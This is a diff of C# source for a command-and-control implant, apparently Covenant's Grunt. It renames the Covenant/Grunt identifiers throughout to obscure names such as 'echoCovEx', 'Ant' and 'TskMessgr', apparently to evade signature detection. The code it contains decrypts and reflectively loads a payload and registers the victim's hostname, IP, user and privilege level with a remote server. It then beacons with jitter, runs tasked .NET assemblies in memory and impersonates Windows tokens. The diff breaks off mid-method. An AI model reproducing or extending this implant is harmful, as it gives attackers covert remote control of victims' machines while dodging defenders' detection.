@@ -253,9 +253,33 @@
                     MySesK.IV = Convert.FromBase64String(My64IV);
                     byte[] DCA = MySesK.CreateDecryptor().TransformFinalBlock(messBy, 0, messBy.Length);
                     Assembly EchoAss = Assembly.Load(DCA);
-                    EchoAss.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { EchoURI, EchoCertHash, GUID, MySesK });
+                    object[] parameters = new object[] {EchoURI, EchoCertHash, GUID, MySesK };
+                    TryMe tryMeInstance = new TryMe();
+                    tryMeInstance.TheRuns(EchoAss, parameters);
                 }
                 catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
+            }
+
+            public class TryMe
+            {
+                public object TheRuns(Assembly EchoAss, object[] parameters)
+                {
+                    Type[] types = EchoAss.GetTypes();
+                    if (types.Length == 0)
+                    {
+                        return null;
+                    }
+
+                    Type targetType = types[0];
+                    MethodInfo[] methods = targetType.GetMethods();
+                    if (methods.Length == 0)
+                    {
+                        return null;
+                    }
+                    MethodInfo targetMethod = methods[0];
+
+                    return targetMethod.Invoke(null, parameters);
+                }
             }
 
             public class EchoWeCli : WebClient
@@ -317,157 +341,157 @@
     using System.Security.Cryptography;
     using System.Text.RegularExpressions;
 
-    namespace GruntExecutor
+    namespace echoCovEx
     {
-        class Grunt
+        class Ant
         {
-            public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
+            public static void Execute(string EchoURI, string EchoCertHash, string GUID, Aes SessK)
             {
                 try
                 {
-                    int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
-                    int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
-                    int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
-                    DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
-            List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-                    List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-            List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-            string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
-            string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-            string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                    bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
-                    bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
+                    int slow = Convert.ToInt32(@"{{REPLACE_DELAY}}");
+                    int Dyno = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
+                    int ConAttp = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
+                    DateTime StopDt = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
+                    List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                    List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                    List<string> EchoHTTPUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+                    string EchoProGetResp = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                    string EchoProPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+                    string EchoProPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                    bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
+                    bool UsePin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
 
-                    string Hostname = Dns.GetHostName();
-                    string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
+                    string Basename = Dns.GetHostName();
+                    string IAddr = Dns.GetHostAddresses(Basename)[0].ToString();
                     foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                     {
                         if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                         {
-                            IPAddress = a.ToString();
+                            IAddr = a.ToString();
                             break;
                         }
                     }
-                    string OperatingSystem = Environment.OSVersion.ToString();
-                    string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
-                    int Integrity = 2;
+                    string OpSys = Environment.OSVersion.ToString();
+                    string CProc = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+                    int Gritty = 2;
                     if (Environment.UserName.ToLower() == "system")
                     {
-                        Integrity = 4;
+                        Gritty = 4;
                     }
                     else
                     {
-                        var identity = WindowsIdentity.GetCurrent();
-                        if (identity.Owner != identity.User)
+                        var idty = WindowsIdentity.GetCurrent();
+                        if (idty.Owner != idty.User)
                         {
-                            Integrity = 3;
+                            Gritty = 3;
                         }
                     }
-                    string UserDomainName = Environment.UserDomainName;
-                    string UserName = Environment.UserName;
+                    string UDomName = Environment.UserDomainName;
+                    string UName = Environment.UserName;
 
-                    string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
-                    IMessenger baseMessenger = null;
-                    baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
-                    baseMessenger.Read();
-                    baseMessenger.Identifier = GUID;
-                    TaskingMessenger messenger = new TaskingMessenger
+                    string RegBod = @"{ ""integrity"": " + Gritty + @", ""process"": """ + CProc + @""", ""userDomainName"": """ + UDomName + @""", ""userName"": """ + UName + @""", ""delay"": " + Convert.ToString(slow) + @", ""jitter"": " + Convert.ToString(Dyno) + @", ""connectAttempts"": " + Convert.ToString(ConAttp) + @", ""status"": 0, ""ipAddress"": """ + IAddr + @""", ""hostname"": """ + Basename + @""", ""operatingSystem"": """ + OpSys + @""" }";
+                    IMessenger bMess = null;
+                    bMess = new HtpMessgr(EchoURI, EchoCertHash, UsePin, ValCert, EchoHeaderNames, EchoHeaderVals, EchoHTTPUrls);
+                    bMess.Read();
+                    bMess.Identifier = GUID;
+                    TskMessgr mess = new TskMessgr
                     (
-                        new MessageCrafter(GUID, SessionKey),
-                        baseMessenger,
-                        new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
+                        new MessCrftr(GUID, SessK),
+                        bMess,
+                        new Profl(EchoProGetResp, EchoProPOSTReq, EchoProPOSTResp)
                     );
-                    messenger.QueueTaskingMessage(RegisterBody);
-                    messenger.WriteTaskingMessage();
-                    messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
+                    mess.QTskMess(RegBod);
+                    mess.WTskMess();
+                    mess.SetAuthenticator(mess.ReadTaskingMessage().Message);
                     try
                     {
                         // A blank upward write, this helps in some cases with an HTTP Proxy
-                        messenger.QueueTaskingMessage("");
-                        messenger.WriteTaskingMessage();
+                        mess.QTskMess("");
+                        mess.WTskMess();
                     }
                     catch (Exception) { }
-                    
-                    List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
-                    WindowsImpersonationContext impersonationContext = null;
+
+                    List<KeyValuePair<string, Thread>> Tsks = new List<KeyValuePair<string, Thread>>();
+                    WindowsImpersonationContext impContext = null;
                     Random rnd = new Random();
-                    int ConnectAttemptCount = 0;
-                    bool alive = true;
-                    while (alive)
+                    int ConAttpCnt = 0;
+                    bool aliver = true;
+                    while (aliver)
                     {
-                        int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
-                        if (rnd.Next(2) == 0) { change = -change; }
-                        Thread.Sleep((Delay + change) * 1000);
+                        int cswitch = rnd.Next((int)Math.Round(slow * (Dyno / 100.00)));
+                        if (rnd.Next(2) == 0) { cswitch = -cswitch; }
+                        Thread.Sleep((slow + cswitch) * 1000);
                         try
                         {
-                            GruntTaskingMessage message = messenger.ReadTaskingMessage();
-                            if (message != null)
+                            AntTskMess amess = mess.ReadTaskingMessage();
+                            if (amess != null)
                             {
-                                ConnectAttemptCount = 0;
-                                string output = "";
-                                if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
+                                ConAttpCnt = 0;
+                                string myout = "";
+                                if (amess.Type == AntTskType.SetDelay || amess.Type == AntTskType.SetJitter || amess.Type == AntTskType.SetConnectAttempts)
                                 {
-                                    if (int.TryParse(message.Message, out int val))
+                                    if (int.TryParse(amess.Message, out int val))
                                     {
-                                        if (message.Type == GruntTaskingType.SetDelay)
+                                        if (amess.Type == AntTskType.SetDelay)
                                         {
-                                            Delay = val;
-                                            output += "Set Delay: " + Delay;
+                                            slow = val;
+                                            myout += "Set slow: " + slow;
                                         }
-                                        else if (message.Type == GruntTaskingType.SetJitter)
+                                        else if (amess.Type == AntTskType.SetJitter)
                                         {
-                                            Jitter = val;
-                                            output += "Set Jitter: " + Jitter;
+                                            Dyno = val;
+                                            myout += "Set Dyno: " + Dyno;
                                         }
-                                        else if (message.Type == GruntTaskingType.SetConnectAttempts)
+                                        else if (amess.Type == AntTskType.SetConnectAttempts)
                                         {
-                                            ConnectAttempts = val;
-                                            output += "Set ConnectAttempts: " + ConnectAttempts;
+                                            ConAttp = val;
+                                            myout += "Set ConAttp: " + ConAttp;
                                         }
                                     }
                                     else
                                     {
-                                        output += "Error parsing: " + message.Message;
+                                        myout += "Error parsing: " + amess.Message;
                                     }
-                                    messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
+                                    mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                                 }
-                                else if (message.Type == GruntTaskingType.SetKillDate)
+                                else if (amess.Type == AntTskType.SetKillDate)
                                 {
-                                    if (DateTime.TryParse(message.Message, out DateTime date))
+                                    if (DateTime.TryParse(amess.Message, out DateTime date))
                                     {
-                                        KillDate = date;
-                                        output += "Set KillDate: " + KillDate.ToString();
+                                        StopDt = date;
+                                        myout += "Set StopDt: " + StopDt.ToString();
                                     }
                                     else
                                     {
-                                        output += "Error parsing: " + message.Message;
+                                        myout += "Error parsing: " + amess.Message;
                                     }
-                                    messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
+                                    mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                                 }
-                                else if (message.Type == GruntTaskingType.Exit)
+                                else if (amess.Type == AntTskType.Exit)
                                 {
-                                    output += "Exited";
-                                    messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
-                                    messenger.WriteTaskingMessage();
+                                    myout += "Exited";
+                                    mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
+                                    mess.WTskMess();
                                     return;
                                 }
-                                else if(message.Type == GruntTaskingType.Tasks)
+                                else if (amess.Type == AntTskType.Tasks)
                                 {
-                                    if (!Tasks.Where(T => T.Value.IsAlive).Any()) { output += "No active tasks!"; }
+                                    if (!Tsks.Where(T => T.Value.IsAlive).Any()) { myout += "No active tasks!"; }
                                     else
                                     {
-                                        output += "Task       Status" + Environment.NewLine;
-                                        output += "----       ------" + Environment.NewLine;
-                                        output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
+                                        myout += "Task       Status" + Environment.NewLine;
+                                        myout += "-++-       -++++-" + Environment.NewLine;
+                                        myout += String.Join(Environment.NewLine, Tsks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
                                     }
-                                    messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
+                                    mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                                 }
-                                else if(message.Type == GruntTaskingType.TaskKill)
+                                else if (amess.Type == AntTskType.TaskKill)
                                 {
-                                    var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
+                                    var matched = Tsks.Where(T => T.Value.IsAlive && T.Key.ToLower() == amess.Message.ToLower());
                                     if (!matched.Any())
                                     {
-                                        output += "No active task with name: " + message.Message;
+                                        myout += "No active task with name: " + amess.Message;
                                     }
                                     else
                                     {
@@ -478,40 +502,40 @@
                                         {
                                             t.Value.Suspend();
                                         }
-                                        output += "Task: " + t.Key + " killed!";
+                                        myout += "Task: " + t.Key + " killed!";
                                     }
-                                    messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
+                                    mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                                 }
-                                else if (message.Token)
+                                else if (amess.Token)
                                 {
-                                    if (impersonationContext != null)
+                                    if (impContext != null)
                                     {
-                                        impersonationContext.Undo();
+                                        impContext.Undo();
                                     }
-                                    IntPtr impersonatedToken = IntPtr.Zero;
+                                    IntPtr impTok = IntPtr.Zero;
                                     Thread t = new Thread(() =>
                                     {
                                         try
                                         {
-                                            impersonatedToken = TaskExecute(messenger, message, Delay);
+                                            impTok = TskExe(mess, amess, slow);
                                         }
-                                        catch {}
+                                        catch { }
                                     });
                                     t.Start();
-                                    Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                    Tsks.Add(new KeyValuePair<string, Thread>(amess.Name, t));
                                     bool completed = t.Join(5000);
-                                    if (completed && impersonatedToken != IntPtr.Zero)
+                                    if (completed && impTok != IntPtr.Zero)
                                     {
                                         try
                                         {
-                                            WindowsIdentity identity = new WindowsIdentity(impersonatedToken);
-                                            impersonationContext = identity.Impersonate();
+                                            WindowsIdentity identity = new WindowsIdentity(impTok);
+                                            impContext = identity.Impersonate();
                                         }
                                         catch (ArgumentException) { }
                                     }
                                     else
                                     {
-                                        impersonationContext = null;
+                                        impContext = null;
                                     }
                                 }
                                 else
@@ -520,29 +544,29 @@
                                     {
                                         try
                                         {
-                                            TaskExecute(messenger, message, Delay);
+                                            TskExe(mess, amess, slow);
                                         }
-                                        catch {}
+                                        catch { }
                                     });
                                     t.Start();
-                                    Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
+                                    Tsks.Add(new KeyValuePair<string, Thread>(amess.Name, t));
                                 }
                             }
-                            messenger.WriteTaskingMessage();
+                            mess.WTskMess();
                         }
                         catch (ObjectDisposedException e)
                         {
-                            ConnectAttemptCount++;
-                            messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "").ToJson());
-                            messenger.WriteTaskingMessage();
+                            ConAttpCnt++;
+                            mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, "").ToJson());
+                            mess.WTskMess();
                         }
                         catch (Exception e)
                         {
-                            ConnectAttemptCount++;
+                            ConAttpCnt++;
                             Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                         }
-                        if (ConnectAttemptCount >= ConnectAttempts) { return; }
-                        if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
+                        if (ConAttpCnt >= ConAttp) { return; }
+                        if (StopDt.CompareTo(DateTime.Now) < 0) { return; }
                     }
                 }
                 catch (Exception e)
@@ -551,137 +575,137 @@
                 }
             }
 
-            private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
+            private static IntPtr TskExe(TskMessgr messgr, AntTskMess mess, int Delay)
             {
-                const int MAX_MESSAGE_SIZE = 1048576;
-                string output = "";
+                const int MAX_MESS_SZ = 1048576;
+                string mout = "";
                 try
                 {
-                    if (message.Type == GruntTaskingType.Assembly)
+                    if (mess.Type == AntTskType.Assembly)
                     {
-                        string[] pieces = message.Message.Split(',');
+                        string[] pieces = mess.Message.Split(',');
                         if (pieces.Length > 0)
                         {
-                            object[] parameters = null;
-                            if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
-                            for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
-                            byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
-                            byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
-                            Assembly gruntTask = Assembly.Load(decompressedBytes);
-                            PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
+                            object[] parms = null;
+                            if (pieces.Length > 1) { parms = new object[pieces.Length - 1]; }
+                            for (int i = 1; i < pieces.Length; i++) { parms[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
+                            byte[] comBy = Convert.FromBase64String(pieces[0]);
+                            byte[] decomBy = Utilities.Decompress(comBy);
+                            Assembly antTsk = Assembly.Load(decomBy);
+                            PropertyInfo strProp = antTsk.GetType("Task").GetProperty("OutputStream");
                             string results = "";
-                            if (streamProp == null)
+                            if (strProp == null)
                             {
-                                results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
+                                results = (string)antTsk.GetType("Task").GetMethod("Execute").Invoke(null, parms);
                             }
                             else
                             {
-                                Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
-                                using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
+                                Thread iThrd = new Thread(() => results = (string)antTsk.GetType("Task").GetMethod("Execute").Invoke(null, parms));
+                                using (AnonymousPipeServerStream pipSrv = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                                 {
-                                    using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
+                                    using (AnonymousPipeClientStream pipCli = new AnonymousPipeClientStream(PipeDirection.Out, pipSrv.GetClientHandleAsString()))
                                     {
-                                        streamProp.SetValue(null, pipeClient, null);
+                                        strProp.SetValue(null, pipCli, null);
                                         DateTime lastTime = DateTime.Now;
-                                        invokeThread.Start();
-                                        using (StreamReader reader = new StreamReader(pipeServer))
+                                        iThrd.Start();
+                                        using (StreamReader rdr = new StreamReader(pipSrv))
                                         {
-                                            object synclock = new object();
-                                            string currentRead = "";
-                                            Thread readThread = new Thread(() => {
+                                            object sclok = new object();
+                                            string cRead = "";
+                                            Thread rThrd = new Thread(() => {
                                                 int count;
-                                                char[] read = new char[MAX_MESSAGE_SIZE];
-                                                while ((count = reader.Read(read, 0, read.Length)) > 0)
+                                                char[] read = new char[MAX_MESS_SZ];
+                                                while ((count = rdr.Read(read, 0, read.Length)) > 0)
                                                 {
-                                                    lock (synclock)
+                                                    lock (sclok)
                                                     {
-                                                        currentRead += new string(read, 0, count);
+                                                        cRead += new string(read, 0, count);
                                                     }
                                                 }
                                             });
-                                            readThread.Start();
-                                            while (readThread.IsAlive)
+                                            rThrd.Start();
+                                            while (rThrd.IsAlive)
                                             {
                                                 Thread.Sleep(Delay * 1000);
-                                                lock (synclock)
+                                                lock (sclok)
                                                 {
                                                     try
                                                     {
-                                                        if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                        if (cRead.Length >= MAX_MESS_SZ)
                                                         {
-                                                            for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
+                                                            for (int i = 0; i < cRead.Length; i += MAX_MESS_SZ)
                                                             {
-                                                                string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
+                                                                string aRead = cRead.Substring(i, Math.Min(MAX_MESS_SZ, cRead.Length - i));
                                                                 try
                                                                 {
-                                                                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
-                                                                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                                    AntTskMessResp response = new AntTskMessResp(AntTskStat.Progressed, aRead);
+                                                                    messgr.QTskMess(response.ToJson(), mess.Name);
                                                                 }
-                                                                catch (Exception) {}
+                                                                catch (Exception) { }
                                                             }
-                                                            currentRead = "";
+                                                            cRead = "";
                                                             lastTime = DateTime.Now;
                                                         }
-                                                        else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
+                                                        else if (cRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
                                                         {
-                                                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
-                                                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                            currentRead = "";
+                                                            AntTskMessResp response = new AntTskMessResp(AntTskStat.Progressed, cRead);
+                                                            messgr.QTskMess(response.ToJson(), mess.Name);
+                                                            cRead = "";
                                                             lastTime = DateTime.Now;
                                                         }
                                                     }
                                                     catch (ThreadAbortException) { break; }
-                                                    catch (Exception) { currentRead = ""; }
+                                                    catch (Exception) { cRead = ""; }
                                                 }
                                             }
-                                            output += currentRead;
+                                            mout += cRead;
                                         }
                                     }
                                 }
-                                invokeThread.Join();
+                                iThrd.Join();
                             }
-                            output += results;
+                            mout += results;
                         }
                     }
-                    else if (message.Type == GruntTaskingType.Connect)
+                    else if (mess.Type == AntTskType.Connect)
                     {
-                        string[] split = message.Message.Split(',');
-                        bool connected = messenger.Connect(split[0], split[1]);
-                        output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
-                                              "Connection to " + split[0] + ":" + split[1] + " failed.";
+                        string[] split = mess.Message.Split(',');
+                        bool connected = messgr.Connect(split[0], split[1]);
+                        mout += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
+                                            "Connection to " + split[0] + ":" + split[1] + " failed.";
                     }
-                    else if (message.Type == GruntTaskingType.Disconnect)
+                    else if (mess.Type == AntTskType.Disconnect)
                     {
-                        bool disconnected = messenger.Disconnect(message.Message);
-                        output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
+                        bool disconnected = messgr.Disconnect(mess.Message);
+                        mout += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                     }
                 }
                 catch (Exception e)
                 {
                     try
                     {
-                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
-                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                        AntTskMessResp response = new AntTskMessResp(AntTskStat.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
+                        messgr.QTskMess(response.ToJson(), mess.Name);
                     }
                     catch (Exception) { }
                 }
                 finally
                 {
-                    for (int i = 0; i < output.Length; i += MAX_MESSAGE_SIZE)
+                    for (int i = 0; i < mout.Length; i += MAX_MESS_SZ)
                     {
-                        string aRead = output.Substring(i, Math.Min(MAX_MESSAGE_SIZE, output.Length - i));
+                        string aRead = mout.Substring(i, Math.Min(MAX_MESS_SZ, mout.Length - i));
                         try
                         {
-                            GruntTaskingStatus status = i + MAX_MESSAGE_SIZE < output.Length ? GruntTaskingStatus.Progressed : GruntTaskingStatus.Completed;
-                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(status, aRead);
-                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                            AntTskStat status = i + MAX_MESS_SZ < mout.Length ? AntTskStat.Progressed : AntTskStat.Completed;
+                            AntTskMessResp response = new AntTskMessResp(status, aRead);
+                            messgr.QTskMess(response.ToJson(), mess.Name);
                         }
-                        catch (Exception) {}
+                        catch (Exception) { }
                     }
-                    if (string.IsNullOrEmpty(output))
+                    if (string.IsNullOrEmpty(mout))
                     {
-                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, "");
-                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                        AntTskMessResp response = new AntTskMessResp(AntTskStat.Completed, "");
+                        messgr.QTskMess(response.ToJson(), mess.Name);
                     }
                 }
                 return WindowsIdentity.GetCurrent().Token;
@@ -694,7 +718,7 @@
             Write
         }
 
-        public class ProfileMessage
+        public class ProMessg
         {
             public MessageType Type { get; set; }
             public string Message { get; set; }
@@ -711,77 +735,77 @@
             string Identifier { get; set; }
             string Authenticator { get; set; }
             EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
-            ProfileMessage Read();
+            ProMessg Read();
             void Write(string Message);
             void Close();
         }
 
-        public class Profile
+        public class Profl
         {
             private string GetResponse { get; }
             private string PostRequest { get; }
             private string PostResponse { get; }
 
-            public Profile(string GetResponse, string PostRequest, string PostResponse)
+            public Profl(string GetResponse, string PostRequest, string PostResponse)
             {
                 this.GetResponse = GetResponse;
                 this.PostRequest = PostRequest;
                 this.PostResponse = PostResponse;
             }
 
-            public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
-            public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
-            public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
-            public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
-            public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
-            public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }
+            public AntEncMess ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
+            public AntEncMess ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
+            public AntEncMess ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
+            public string FormatGetResponse(AntEncMess Message) { return Format(this.GetResponse, Message); }
+            public string FormatPostRequest(AntEncMess Message) { return Format(this.PostRequest, Message); }
+            public string FormatPostResponse(AntEncMess Message) { return Format(this.PostResponse, Message); }
 
-            private static GruntEncryptedMessage Parse(string Format, string Message)
+            private static AntEncMess Parse(string Format, string Message)
             {
-                string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
+                string json = Common.AntEnc.GetString(Utilities.MessageTransform.Invert(
                     Utilities.Parse(Message, Format)[0]
                 ));
                 if (json == null || json.Length < 3)
                 {
                     return null;
                 }
-                return GruntEncryptedMessage.FromJson(json);
+                return AntEncMess.FromJson(json);
             }
 
-            private static string Format(string Format, GruntEncryptedMessage Message)
+            private static string Format(string Format, AntEncMess Message)
             {
                 return String.Format(Format,
-                    Utilities.MessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
+                    Utilities.MessageTransform.Transform(Common.AntEnc.GetBytes(AntEncMess.ToJson(Message)))
                 );
             }
         }
 
-        public class TaskingMessenger
+        public class TskMessgr
         {
             private object _UpstreamLock = new object();
             private IMessenger UpstreamMessenger { get; set; }
             private object _MessageQueueLock = new object();
             private Queue<string> MessageQueue { get; } = new Queue<string>();
 
-            private MessageCrafter Crafter { get; }
-            private Profile Profile { get; }
+            private MessCrftr Crafter { get; }
+            private Profl Profile { get; }
 
             protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();
 
-            public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
+            public TskMessgr(MessCrftr Crafter, IMessenger Messenger, Profl Profile)
             {
                 this.Crafter = Crafter;
                 this.UpstreamMessenger = Messenger;
                 this.Profile = Profile;
                 this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
-                    this.QueueTaskingMessage(e.Message);
-                    this.WriteTaskingMessage();
+                    this.QTskMess(e.Message);
+                    this.WTskMess();
                 };
             }
 
-            public GruntTaskingMessage ReadTaskingMessage()
+            public AntTskMess ReadTaskingMessage()
             {
-                ProfileMessage readMessage = null;
+                ProMessg readMessage = null;
                 lock (_UpstreamLock)
                 {
                     readMessage = this.UpstreamMessenger.Read();
@@ -790,48 +814,48 @@
                 {
                     return null;
                 }
-                GruntEncryptedMessage gruntMessage = null;
-                if (readMessage.Type == MessageType.Read) 
+                AntEncMess AntMess = null;
+                if (readMessage.Type == MessageType.Read)
                 {
-                    gruntMessage = this.Profile.ParseGetResponse(readMessage.Message);
+                    AntMess = this.Profile.ParseGetResponse(readMessage.Message);
                 }
                 else if (readMessage.Type == MessageType.Write)
                 {
-                    gruntMessage = this.Profile.ParsePostResponse(readMessage.Message);
+                    AntMess = this.Profile.ParsePostResponse(readMessage.Message);
                 }
-                if (gruntMessage == null)
+                if (AntMess == null)
                 {
                     return null;
                 }
-                else if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
+                else if (AntMess.Type == AntEncMess.GruntEncryptedMessageType.Tasking)
                 {
-                    string json = this.Crafter.Retrieve(gruntMessage);
